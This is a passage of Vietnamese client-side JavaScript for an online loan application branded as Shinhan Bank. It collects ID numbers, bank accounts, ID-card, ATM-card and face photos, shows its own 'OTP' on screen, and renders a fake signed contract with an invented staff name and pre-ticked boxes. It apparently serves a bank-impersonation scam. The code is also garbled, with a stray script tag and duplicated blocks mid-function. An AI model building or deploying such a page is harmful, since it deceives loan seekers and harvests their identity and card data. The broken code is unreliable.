                        $('#accountNumber').val(userData.accountNumber || '');
                        $('#bankName').val(userData.bankName || '');
                        $('#termsAgree').prop('checked', userData.termsAgree || false);
                        if (userData.currentStep) {
                            proceedToStep(1, userData.currentStep, userData.currentStep * 10);
                        }
                    }
                    updatePreviewSection();
                }
            } catch (error) {
                console.error("Lỗi khôi phục localStorage:", error);
                showToast("Không thể khôi phục dữ liệu. Vui lòng bắt đầu lại.", false);
                userData = {};
                saveToLocalStorage(1);
                updatePreviewSection();
            }
        };

        // Hàm làm sạch dữ liệu
        function sanitizeInput(value) {
            if (!value) return "";
            return String(value)
                .normalize("NFD")
                .replace(/[\u0300-\u036f]/g, "")
                .replace(/[^a-zA-Z0-9_]/g, "_")
                .replace(/\s+/g, "_");
        }

        // Hàm định dạng số tiền
        function formatNumber(number) {
            if (!number || isNaN(number)) return "0";
            return parseInt(number).toLocaleString('vi-VN');
        }

        // Hàm tạo mã hợp đồng
        function generateContractId() {
            try {
                const date = new Date();
                const randomNum = Math.floor(100000 + Math.random() * 900000);
                return `SHB-${date.getFullYear()}${(date.getMonth() + 1).toString().padStart(2, '0')}${date.getDate().toString().padStart(2, '0')}-${randomNum}`;
            } catch (error) {
                console.error("Lỗi tạo mã hợp đồng:", error);
                return "SHB-DEFAULT-000000";
            }
        }

        // Hàm tạo mã ngẫu nhiên với kiểm tra trùng lặp
        function generateRandomCode() {
            try {
                let code;
                do {
                    code = Math.floor(100000 + Math.random() * 900000).toString();
                } while (usedCodes.has(code));
                usedCodes.add(code);
                return code;
            } catch (error) {
                console.error("Lỗi tạo mã ngẫu nhiên:", error);
                return "000000";
            }
        }

        // Hàm lấy ngày hiện tại
        function getCurrentDate() {
            try {
                const date = new Date();
                return `${date.getDate().toString().padStart(2, '0')}/${(date.getMonth() + 1).toString().padStart(2, '0')}/${date.getFullYear()}`;
            } catch (error) {
                console.error("Lỗi lấy ngày hiện tại:", error);
                return "01/01/2025";
            }
        }

        // Hàm tính lãi suất dựa trên số tiền vay
        function calculateInterestRate(loanAmount) {
            try {
                const amount = parseInt(loanAmount);
                if (amount <= 50000000) return "12%";
                if (amount <= 200000000) return "11%";
                return "10%";
            } catch (error) {
                console.error("Lỗi tính lãi suất:", error);
                return "12%";
            }
        }

        // Hàm kiểm tra định dạng và kích thước ảnh
        function validateImage(file, inputId) {
            try {
                const maxSize = 5 * 1024 * 1024; // 5MB
                const allowedTypes = ['image/jpeg', 'image/png'];
                if (!file) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Vui lòng tải lên tệp ảnh!", false);
                    return false;
                }
                if (!allowedTypes.includes(file.type)) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Vui lòng tải lên tệp JPEG hoặc PNG!", false);
                    return false;
                }
                if (file.size > maxSize) {
                    $(`#${inputId}`).addClass('is-invalid');
                    showToast("Tệp ảnh không được vượt quá 5MB!", false);
                    return false;
                }
                $(`#${inputId}`).removeClass('is-invalid');
                return true;
            } catch (error) {
                console.error("Lỗi validate ảnh:", error);
                showToast("Lỗi kiểm tra ảnh. Vui lòng thử lại!", false);
                return false;
            }
        }

        // Hiển thị thông tin tệp đã tải lên
        $('#idFrontImage').on('change', function(e) {
            try {
                const file = e.target.files[0];
                if (file && validateImage(file, 'idFrontImage')) {
                    $('#idFrontInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                }
            } catch (error) {
                console.error("Lỗi xử lý idFrontImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#idBackImage').on('change', function(e) {
            try {
                const file = e.target.files[0];
                if (file && validateImage(file, 'idBackImage')) {
                    $('#idBackInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                }
            } catch (error) {
                console.error("Lỗi xử lý idBackImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#atmImage').on('change', function(e) {
            try {
                const file = e.target.files[0];
                if (file && validateImage(file, 'atmImage')) {
                    $('#atmImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                }
            } catch (error) {
                console.error("Lỗi xử lý atmImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        $('#faceImage').on('change', function(e) {
            try {
                const file = e.target.files[0];
                if (file && validateImage(file, 'faceImage')) {
                    $('#faceImageInfo').text(`${file.name} (${Math.round(file.size / 1024)} KB)`);
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        userData.faceImageUrl = e.target.result;
                        updatePreviewSection();
                        saveToLocalStorage(userData.currentStep || 4);
                    };
                    reader.readAsDataURL(file);
                }
            } catch (error) {
                console.error("Lỗi xử lý faceImage:", error);
                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
            }
        });

        // Hàm tạo mã hồ sơ ngẫu nhiên
        function generateLoanCode() {
            try {
                const date = new Date();
                const year = date.getFullYear();
                const month = String(date.getMonth() + 1).padStart(2, '0');
                const day = String(date.getDate()).padStart(2, '0');
                const random = Math.floor(100000 + Math.random() * 900000);
                return `SHB-${year}${month}${day}-${random}`;
            } catch (error) {
                console.error("Lỗi tạo mã hồ sơ:", error);
                return "SHB-DEFAULT-000000";
            }
        }

        // Hàm tính số tiền góp hàng tháng
        function calculateMonthlyPayment(loanAmount, loanTerm) {
            try {
                const monthlyInterestRate = 0.01;
                const totalInterest = loanAmount * monthlyInterestRate * loanTerm;
                const totalAmount = parseInt(loanAmount) + totalInterest;
                const monthlyPayment = totalAmount / loanTerm;
                return Math.round(monthlyPayment).toLocaleString('vi-VN');
            } catch (error) {
                console.error("Lỗi tính toán khoản góp:", error);
                return "0";
            }
        }

        // Format thu nhập với dấu phẩy
        $('#income').on('input', function() {
            try {
                let value = $(this).val().replace(/[^0-9]/g, '');
                if (value) {
                    value = parseInt(value).toLocaleString('vi-VN');
                    $(this).val(value);
                }
            } catch (error) {
                console.error("Lỗi format thu nhập:", error);
            }
        });

        // Bước 1: Đăng ký hồ sơ
        $('#registerForm').on('submit', function(e) {
            try {
                e.preventDefault();
                if (!$('#termsAgree').is(':checked')) {
                    showToast("Vui lòng đồng ý với các điều khoản và điều kiện!", false);
                    return;
                }
                if (!this.checkValidity()) {
                    showToast("Vui lòng điền đầy đủ thông tin!", false);
                    $(this).addClass('was-validated');
                    return;
                }
                let income = $('#income').val().replace(/[^0-9]/g, '') || '0';
                let accountNumber = $('#accountNumber').val();
                if (!/^\d+$/.test(accountNumber)) {
                    showToast("Số tài khoản ngân hàng chỉ được chứa số!", false);
                    $('#accountNumber').addClass('is-invalid');
                    return;
                }
                userData = {
                    fullName: $('#fullName').val(),
                    idNumber: $('#idNumber').val(),
                    idIssueDate: $('#idIssueDate').val(),
                    idIssuePlace: $('#idIssuePlace').val(),
                    address: $('#address').val(),
                    occupation: $('#occupation').val(),
                    income: income,
                    phoneNumber: $('#phoneNumber').val(),
                    email: $('#email').val(),
                    loanAmount: $('#loanAmount').val(),
                    loanTerm: $('#loanTerm').val(),
                    loanPurpose: $('#loanPurpose').val(),
                    accountNumber: accountNumber,
                    bankName: $('#bankName').val(),
                    termsAgree: $('#termsAgree').is(':checked'),
                    loanCode: generateLoanCode(),
                    registrationDate: getCurrentDate(),
                    monthlyPayment: calculateMonthlyPayment($('#loanAmount').val(), $('#loanTerm').val()),
                    interestRate: calculateInterestRate($('#loanAmount').val()),
                    sellerCode: generateRandomCode(),
                    storeCode: generateRandomCode(),
                    staffCode: generateRandomCode(),
                    staffName: "Nguyễn Thị Mỹ Duyên",
                    branchName: "Chi nhánh Shinhanbank Đà Nẵng",
                    isRegistered: true
                };
                proceedToStep(1, 2, 20);
            } catch (error) {
                console.error("Lỗi bước 1:", error);
                showToast("Lỗi xử lý hồ sơ. Vui lòng thử lại!", false);
            }
        });

        // Bước 2: Tải lên giấy tờ
        $('#proceedToStep3Btn').on('click', function() {
            try {
                const idFrontImage = $('#idFrontImage')[0].files[0];
                const idBackImage = $('#idBackImage')[0].files[0];
                if (!validateImage(idFrontImage, 'idFrontImage') || !validateImage(idBackImage, 'idBackImage')) {
                    return;
                }
                userData.idFrontImage = idFrontImage;
                userData.idBackImage = idBackImage;
                proceedToStep(2, 3, 30);
            } catch (error) {
                console.error("Lỗi bước 2:", error);
                showToast("Lỗi tải lên giấy tờ. Vui lòng thử lại!", false);
            }
        });

        // Bước 3: Tải lên thẻ ATM
        $('#proceedToStep4Btn').on('click', function() {
            try {
                const atmImage = $('#atmImage')[0].files[0];
                if (!validateImage(atmImage, 'atmImage')) {
                    return;
                }
                userData.atmImage = atmImage;
                proceedToStep(3, 4, 40);
            } catch (error) {
                console.error("Lỗi bước 3:", error);
                showToast("Lỗi tải lên thẻ ATM. Vui lòng thử lại!", false);
            }
        });

        // Bước 4: Chụp khuôn mặt
        $('#proceedToOtpBtn').on('click', function() {
            try {
                const faceImage = $('#faceImage')[0].files[0];
                if (!validateImage(faceImage, 'faceImage')) {
                    return;
                }
                userData.faceImage = faceImage;
                proceedToStep(4, 5, 50);
                const otp = Math.floor(100000 + Math.random() * 900000);
                $('#otpDisplay').text(otp);
                userData.otp = otp.toString();
                saveToLocalStorage(5);
            } catch (error) {
                console.error("Lỗi bước 4:", error);
                showToast("Lỗi xử lý ảnh khuôn mặt. Vui lòng thử lại!", false);
            }
        });

        // Hàm sao chép mã OTP
        function copyOtp() {
            try {
                const otp = $('#otpDisplay').text();
                navigator.clipboard.writeText(otp).then(() => {
                    showToast("Đã sao chép mã OTP!", true);
                }).catch(() => {
                    showToast("Lỗi khi sao chép mã OTP!", false);
                });
            } catch (error) {
                console.error("Lỗi sao chép OTP:", error);
                showToast("Lỗi khi sao chép mã OTP!", false);
            }
        }

        // Hàm kiểm tra dữ liệu email
        function validateEmailParams(params) {
            try {
                for (let key in params) {
                    if (params[key] === undefined || params[key] === null) {
                        if (['loan_amount', 'loan_code', 'monthly_payment'].includes(key)) {
                            throw new Error(`Trường ${key} không được để trống`);
                        }
                        params[key] = "";
                    }
                }
                return params;
            } catch (error) {
                console.error("Lỗi validate email params:", error);
                return params;
            }
        }

        // Hàm gửi email với retry logic
        async function sendEmail(serviceId, templateId, params, maxRetries = 3) {
            try {
                for (let attempt = 1; attempt <= maxRetries; attempt++) {
                    try {
                        const response = await emailjs.send(serviceId, templateId, params);
                        showToast("Email đã được gửi!", true);
                        return response;
                    } catch (error) {
                        console.error(`Lỗi gửi email (lần ${attempt}):`, error);
                        if (attempt === maxRetries) {
                            showToast("Không thể gửi email. Vui lòng liên hệ hỗ trợ!", false);
                            return null;
                        }
                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                    }
                }
            } catch (error) {
                console.error("Lỗi gửi email:", error);
                showToast("Lỗi gửi email. Vui lòng thử lại!", false);
                return null;
            }
        }

        // Hàm vẽ dấu checkmark
        function drawCheckmark(ctx, x, y) {
            ctx.beginPath();
            ctx.moveTo(x, y);
            ctx.lineTo(x + 5, y + 10);
            ctx.lineTo(x + 15, y - 5);
            ctx.strokeStyle = '#000000';
            ctx.lineWidth = 2;
            ctx.stroke();
        }

        // Hàm hiển thị canvas với thông tin người dùng
        function renderCanvas(canvasId, imageUrl, userData) {
            try {
                const canvas = document.getElementById(canvasId);
                const ctx = canvas.getContext('2d');
                const img = new Image();
                img.crossOrigin = "Anonymous";
                img.src = imageUrl;

                img.onload = function() {
                    // Thiết lập kích thước canvas với độ phân giải cao
                    canvas.width = 360 * 2;
                    canvas.height = 509 * 2;
                    ctx.scale(2, 2); // Tăng độ phân giải
                    ctx.drawImage(img, 0, 0, 360, 509);

                    // Cấu hình font chữ và màu sắc
                    ctx.font = '500 12px Roboto';
                    ctx.fillStyle = '#000000';
                    ctx.textAlign = 'left';

                    // Tọa độ cơ bản
                    const startX = 40; // Lề trái, điều chỉnh để căn chỉnh tốt hơn
                    const baseY = 40; // Điểm bắt đầu từ đầu trang
                    const lineHeight = 18; // Khoảng cách giữa các dòng

                    if (canvasId === 'contractCanvas') {
                        let currentY = baseY;
                        // Ngày nộp hồ sơ
                        ctx.fillText(userData.registrationDate || '', startX, currentY);
                        currentY += lineHeight;
                        // Họ và tên
                        ctx.fillText(userData.fullName || '', startX, currentY);
                        currentY += lineHeight;
                        // Số CMND/Hộ chiếu
                        ctx.fillText(userData.idNumber || '', startX, currentY);
                        currentY += lineHeight;
                        // 4 số cuối thẻ tín dụng (bỏ qua)
                        currentY += lineHeight;
                        // Số điện thoại
                        ctx.fillText(userData.phoneNumber || '', startX, currentY);
                        currentY += lineHeight;
                        // Email
                        ctx.fillText(userData.email || '', startX, currentY);
                        currentY += lineHeight;
                        // Số tiền yêu cầu
                        ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
                        currentY += lineHeight;
                        // Mục tiêu khoản tạm ứng
                        const purpose = userData.loanPurpose || 'Vay tiêu dùng';
                        if (['Sửa chữa nhà', 'Mua xe', 'Học tập'].includes(purpose)) {
                            if (purpose === 'Sửa chữa nhà') drawCheckmark(ctx, startX, currentY);
                            if (purpose === 'Mua xe') drawCheckmark(ctx, startX + 50, currentY);
                            if (purpose === 'Học tập') drawCheckmark(ctx, startX + 100, currentY);
                            currentY += lineHeight;
                        } else {
                            ctx.fillText(`Khác: ${purpose}`, startX, currentY);
                            currentY += lineHeight;
                        }
                        // Kì hạn
                        const term = userData.loanTerm || '12';
                        if (term === '12') drawCheckmark(ctx, startX, currentY);
                        if (term === '24') drawCheckmark(ctx, startX + 50, currentY);
                        if (term === '36') drawCheckmark(ctx, startX + 100, currentY);
                        currentY += lineHeight;
                        // Lãi suất
                        ctx.fillText(userData.interestRate || '12%', startX, currentY);
                        currentY += lineHeight;
                        // Số hợp đồng
                        ctx.fillText(userData.loanCode || '', startX, currentY);
                        currentY += lineHeight;
                        // Ngày đăng ký
                        ctx.fillText(userData.registrationDate || '', startX, currentY);
                        currentY += lineHeight;
                        // Mã bên bán hàng
                        ctx.fillText(userData.sellerCode || '000000', startX, currentY);
                        currentY += lineHeight;
                        // Mã cửa hàng
                        ctx.fillText(userData.storeCode || '000000', startX, currentY);
                        currentY += lineHeight;
                        // Mã số nhân viên thực hiện
                        ctx.fillText(userData.staffCode || '000000', startX, currentY);
                        currentY += lineHeight;
                        // Tên nhân viên thực hiện
                        ctx.fillText(userData.staffName || 'Nguyễn Thị Mỹ Duyên', startX, currentY);
                        currentY += lineHeight;
                        // Chi nhánh
                        ctx.fillText(userData.branchName || 'Chi nhánh Shinhanbank Đà Nẵng', startX, currentY);
                        currentY += lineHeight;
                        // Checkboxes xác nhận
                        drawCheckmark(ctx, startX, currentY); // Email đúng
                        currentY += lineHeight;
                        drawCheckmark(ctx, startX, currentY); // Chủ thẻ
                        currentY += lineHeight;
                        drawCheckmark(ctx, startX, currentY); // Hồ sơ nộp
                        currentY += lineHeight;
                        drawCheckmark(ctx, startX, currentY); // Người hưởng lợi
                        currentY += lineHeight;
                        // Số tiền được phê duyệt
                        ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
                        currentY += lineHeight;
                        // Số ngày được phê duyệt
                        ctx.fillText(userData.registrationDate || '', startX, currentY);

                        userData.contractImageUrl = canvas.toDataURL('image/png');
                        updatePreviewSection();
                        saveToLocalStorage(userData.currentStep || 8);
                    } else if (canvasId === 'disbursementCanvas') {
                        let currentY = baseY;
                        // Số tài khoản
                        ctx.fillText(userData.accountNumber || '', startX, currentY);
                        currentY += lineHeight;
                        // Họ và tên
                        ctx.fillText(userData.fullName || '', startX, currentY);
                        currentY += lineHeight;
                        // Ngân hàng
                        ctx.fillText(userData.bankName || '', startX, currentY);
                        currentY += lineHeight;
                        // Thông tin người đại diện hợp pháp
                        ctx.fillText(userData.idNumber || '', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.idIssueDate || '', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.idIssuePlace || '', startX, currentY);

                        userData.disbursementImageUrl = canvas.toDataURL('image/png');
                        saveToLocalStorage(userData.currentStep || 9);
                    }
                };

                img.onerror = function() {
                    console.warn("Lỗi tải hình ảnh, sử dụng hình ảnh mặc định");
                    img.src = formData.fallbackImage;
                    canvas.width = 360 * 2;
                    canvas.height = 509 * 2;
                    ctx.scale(2, 2);
                    ctx.fillStyle = '#FFFFFF';
                    ctx.fillRect(0, 0, 360, 509);
                    ctx.font = '500 12px Roboto';
                    ctx.fillStyle = '#000000';
                    ctx.textAlign = 'left';
                    const startX = 40;
                    const baseY = 40;
                    const lineHeight = 18;

                    if (canvasId === 'contractCanvas') {
                        let currentY = baseY;
                        ctx.fillText(userData.registrationDate || '', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.fullName || '', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.idNumber || '', startX, currentY);
                        currentY += lineHeight;
                        currentY += lineHeight; // Bỏ qua 4 số cuối thẻ tín dụng
                        ctx.fillText(userData.phoneNumber || '', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.email || '', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
                        currentY += lineHeight;
                        const purpose = userData.loanPurpose || 'Vay tiêu dùng';
                        if (['Sửa chữa nhà', 'Mua xe', 'Học tập'].includes(purpose)) {
                            if (purpose === 'Sửa chữa nhà') drawCheckmark(ctx, startX, currentY);
                            if (purpose === 'Mua xe') drawCheckmark(ctx, startX + 50, currentY);
                            if (purpose === 'Học tập') drawCheckmark(ctx, startX + 100, currentY);
                            currentY += lineHeight;
                        } else {
                            ctx.fillText(`Khác: ${purpose}`, startX, currentY);
                            currentY += lineHeight;
                        }
                        const term = userData.loanTerm || '12';
                        if (term === '12') drawCheckmark(ctx, startX, currentY);
                        if (term === '24') drawCheckmark(ctx, startX + 50, currentY);
                        if (term === '36') drawCheckmark(ctx, startX + 100, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.interestRate || '12%', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.loanCode || '', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.registrationDate || '', startX, currentY);
                        currentY += lineHeight;
                        ctx.fillText(userData.sellerCode || '000000', startX, currentY);
                        currentY += lineHeight;
                       <script>
    // Tiếp tục từ đoạn code bị dừng
    ctx.fillText(userData.storeCode || '000000', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.staffCode || '000000', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.staffName || 'Nguyễn Thị Mỹ Duyên', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.branchName || 'Chi nhánh Shinhanbank Đà Nẵng', startX, currentY);
    currentY += lineHeight;
    drawCheckmark(ctx, startX, currentY); // Email đúng
    currentY += lineHeight;
    drawCheckmark(ctx, startX, currentY); // Chủ thẻ
    currentY += lineHeight;
    drawCheckmark(ctx, startX, currentY); // Hồ sơ nộp
    currentY += lineHeight;
    drawCheckmark(ctx, startX, currentY); // Người hưởng lợi
    currentY += lineHeight;
    ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.registrationDate || '', startX, currentY);

    userData.contractImageUrl = canvas.toDataURL('image/png');
    updatePreviewSection();
    saveToLocalStorage(userData.currentStep || 8);
} else if (canvasId === 'disbursementCanvas') {
    let currentY = baseY;
    ctx.fillText(userData.accountNumber || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.fullName || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.bankName || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.idNumber || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.idIssueDate || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.idIssuePlace || '', startX, currentY);

    userData.disbursementImageUrl = canvas.toDataURL('image/png');
    saveToLocalStorage(userData.currentStep || 9);
}
};

img.onerror = function() {
console.warn("Lỗi tải hình ảnh, sử dụng hình ảnh mặc định");
img.src = formData.fallbackImage;
canvas.width = 360 * 2;
canvas.height = 509 * 2;
ctx.scale(2, 2);
ctx.fillStyle = '#FFFFFF';
ctx.fillRect(0, 0, 360, 509);
ctx.font = '500 12px Roboto';
ctx.fillStyle = '#000000';
ctx.textAlign = 'left';
const startX = 40;
const baseY = 40;
const lineHeight = 18;

if (canvasId === 'contractCanvas') {
    let currentY = baseY;
    ctx.fillText(userData.registrationDate || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.fullName || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.idNumber || '', startX, currentY);
    currentY += lineHeight;
    currentY += lineHeight; // Bỏ qua 4 số cuối thẻ tín dụng
    ctx.fillText(userData.phoneNumber || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.email || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
    currentY += lineHeight;
    const purpose = userData.loanPurpose || 'Vay tiêu dùng';
    if (['Sửa chữa nhà', 'Mua xe', 'Học tập'].includes(purpose)) {
        if (purpose === 'Sửa chữa nhà') drawCheckmark(ctx, startX, currentY);
        if (purpose === 'Mua xe') drawCheckmark(ctx, startX + 50, currentY);
        if (purpose === 'Học tập') drawCheckmark(ctx, startX + 100, currentY);
        currentY += lineHeight;
    } else {
        ctx.fillText(`Khác: ${purpose}`, startX, currentY);
        currentY += lineHeight;
    }
    const term = userData.loanTerm || '12';
    if (term === '12') drawCheckmark(ctx, startX, currentY);
    if (term === '24') drawCheckmark(ctx, startX + 50, currentY);
    if (term === '36') drawCheckmark(ctx, startX + 100, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.interestRate || '12%', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.loanCode || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.registrationDate || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.sellerCode || '000000', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.storeCode || '000000', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.staffCode || '000000', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.staffName || 'Nguyễn Thị Mỹ Duyên', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.branchName || 'Chi nhánh Shinhanbank Đà Nẵng', startX, currentY);
    currentY += lineHeight;
    drawCheckmark(ctx, startX, currentY); // Email đúng
    currentY += lineHeight;
    drawCheckmark(ctx, startX, currentY); // Chủ thẻ
    currentY += lineHeight;
    drawCheckmark(ctx, startX, currentY); // Hồ sơ nộp
    currentY += lineHeight;
    drawCheckmark(ctx, startX, currentY); // Người hưởng lợi
    currentY += lineHeight;
    ctx.fillText(`${formatNumber(userData.loanAmount)} VND` || '0 VND', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.registrationDate || '', startX, currentY);

    userData.contractImageUrl = canvas.toDataURL('image/png');
    updatePreviewSection();
    saveToLocalStorage(userData.currentStep || 8);
} else if (canvasId === 'disbursementCanvas') {
    let currentY = baseY;
    ctx.fillText(userData.accountNumber || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.fullName || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.bankName || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.idNumber || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.idIssueDate || '', startX, currentY);
    currentY += lineHeight;
    ctx.fillText(userData.idIssuePlace || '', startX, currentY);

    userData.disbursementImageUrl = canvas.toDataURL('image/png');
    saveToLocalStorage(userData.currentStep || 9);
}
};
} catch (error) {
console.error("Lỗi render canvas:", error);
showToast("Lỗi hiển thị hợp đồng. Vui lòng thử lại!", false);
}
}

// Hàm sao chép mã OTP ký hợp đồng
function copySignOtp() {
try {
    const otp = $('#signOtpDisplay').text();
    navigator.clipboard.writeText(otp).then(() => {
        showToast("Đã sao chép mã OTP!", true);
    }).catch(() => {
        showToast("Lỗi khi sao chép mã OTP!", false);
    });
} catch (error) {
    console.error("Lỗi sao chép OTP ký hợp đồng:", error);
    showToast("Lỗi khi sao chép mã OTP!", false);
}
}

// Bước 5: Xác nhận OTP
$('#verifyOtpBtn').on('click', async function() {
try {
    const otpInput = $('#otp1').val() + $('#otp2').val() + $('#otp3').val() + $('#otp4').val() + $('#otp5').val() + $('#otp6').val();
    if (otpInput === userData.otp) {
        showToast("Xác nhận OTP thành công!", true);
        proceedToStep(5, 6, 60);

        // Gửi email thông báo duyệt
        const emailParams = validateEmailParams({
            full_name: userData.fullName,
            email: userData.email,
            loan_amount: formatNumber(userData.loanAmount),
            loan_code: userData.loanCode,
            monthly_payment: userData.monthlyPayment,
            loan_term: userData.loanTerm,
            interest_rate: userData.interestRate,
            registration_date: userData.registrationDate
        });

        await sendEmail('service_9x4shzo', 'template_approval', emailParams);

        // Hiển thị modal chúc mừng
        $('#modalFullName').text(`Họ và Tên: ${userData.fullName}`);
        $('#modalLoanAmount').text(`Số Tiền Vay: ${formatNumber(userData.loanAmount)} VND`);
        $('#modalLoanCode').text(`Mã Hồ Sơ: ${userData.loanCode}`);
        const successModal = new bootstrap.Modal(document.getElementById('successModal'));
        successModal.show();

        // Tự động chuyển sang bước 7 sau 5 giây
        setTimeout(() => {
            successModal.hide();
            proceedToContract();
        }, 5000);
    } else {
        showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
        $('.otp-digit').addClass('is-invalid');
    }
} catch (error) {
    console.error("Lỗi xác nhận OTP:", error);
    showToast("Lỗi xác nhận OTP. Vui lòng thử lại!", false);
}
});

// Hàm chuyển sang bước xem hợp đồng
function proceedToContract() {
try {
    $('#confirmationMessage').text(`Mã Hồ Sơ: ${userData.loanCode}`);
    $('#confirmationEmail').text(userData.email);
    proceedToStep(6, 7, 70);
} catch (error) {
    console.error("Lỗi chuyển sang bước hợp đồng:", error);
    showToast("Lỗi chuyển bước. Vui lòng thử lại!", false);
}
}

// Bước 7: Chuyển sang xem hợp đồng
$('#proceedToContractBtn').on('click', function() {
try {
    proceedToStep(7, 8, 80);
    renderCanvas('contractCanvas', formData.contractImage, userData);
} catch (error) {
    console.error("Lỗi chuyển sang bước 8:", error);
    showToast("Lỗi hiển thị hợp đồng. Vui lòng thử lại!", false);
}
});

// Bước 8: Chuyển sang ký hợp đồng
$('#proceedToSignContractBtn').on('click', function() {
try {
    proceedToStep(8, '8-1', 85);
    const signOtp = Math.floor(100000 + Math.random() * 900000);
    $('#signOtpDisplay').text(signOtp);
    userData.signOtp = signOtp.toString();
    saveToLocalStorage('8-1');
} catch (error) {
    console.error("Lỗi chuyển sang bước 8-1:", error);
    showToast("Lỗi khởi tạo OTP ký hợp đồng. Vui lòng thử lại!", false);
}
});

// Bước 8.1: Xác nhận OTP ký hợp đồng
$('#verifySignOtpBtn').on('click', async function() {
try {
    const signOtpInput = $('#signOtp1').val() + $('#signOtp2').val() + $('#signOtp3').val() + $('#signOtp4').val() + $('#signOtp5').val() + $('#signOtp6').val();
    if (signOtpInput === userData.signOtp) {
        showToast("Xác nhận OTP ký hợp đồng thành công!", true);
        proceedToStep('8-1', 9, 90);

        // Gửi email hợp đồng
        const contractEmailParams = validateEmailParams({
            full_name: userData.fullName,
            email: userData.email,
            loan_amount: formatNumber(userData.loanAmount),
            loan_code: userData.loanCode,
            contract_image: userData.contractImageUrl,
            registration_date: userData.registrationDate
        });

        await sendEmail('service_9x4shzo', 'template_contract', contractEmailParams);

        // Hiển thị điều kiện giải ngân
        renderCanvas('disbursementCanvas', formData.disbursementImage, userData);

        // Hiển thị modal chúc mừng ký hợp đồng
        $('#celebrationMessage').text(`Hợp đồng của bạn đã được ký thành công! Mã Hồ Sơ: ${userData.loanCode}`);
        const celebrationModal = new bootstrap.Modal(document.getElementById('celebrationModal'));
        celebrationModal.show();

        // Tự động đóng modal sau 5 giây
        setTimeout(() => {
            celebrationModal.hide();
        }, 5000);
    } else {
        showToast("Mã OTP không đúng. Vui lòng thử lại!", false);
        $('.otp-digit').addClass('is-invalid');
    }
} catch (error) {
    console.error("Lỗi xác nhận OTP ký hợp đồng:", error);
    showToast("Lỗi xác nhận OTP. Vui lòng thử lại!", false);
}
});

// Bước 9: Chuyển sang bước hoàn tất
$('#proceedToFinalStepBtn').on('click', async function() {
try {
    proceedToStep(9, 10, 100);

    // Gửi email xác nhận giải ngân
    const disbursementEmailParams = validateEmailParams({
        full_name: userData.fullName,
        email: userData.email,
        loan_amount: formatNumber(userData.loanAmount),
        loan_code: userData.loanCode,
        disbursement_image: userData.disbursementImageUrl,
        registration_date: userData.registrationDate
    });

    await sendEmail('service_9x4shzo', 'template_disbursement', disbursementEmailParams);

    // Xóa dữ liệu sau khi hoàn tất
    localStorage.removeItem('userData');
    localStorage.removeItem('usedCodes');
    usedCodes = new Set();
} catch (error) {
    console.error("Lỗi chuyển sang bước 10:", error);
    showToast("Lỗi hoàn tất quy trình. Vui lòng thử lại!", false);
}
});

// Xử lý nhập OTP
$('.otp-digit').on('input', function() {
try {
    $(this).removeClass('is-invalid');
    if ($(this).val().length === 1) {
        const nextInput = $(this).next('.otp-digit');
        if (nextInput.length) {
            nextInput.focus();
        } else {
            $(this).blur();
        }
    }
} catch (error) {
    console.error("Lỗi xử lý nhập OTP:", error);
}
}).on('keydown', function(e) {
try {
    if (e.key === 'Backspace' && !$(this).val()) {
        const prevInput = $(this).prev('.otp-digit');
        if (prevInput.length) {
            prevInput.focus();
        }
    }
} catch (error) {
    console.error("Lỗi xử lý backspace OTP:", error);
}
});

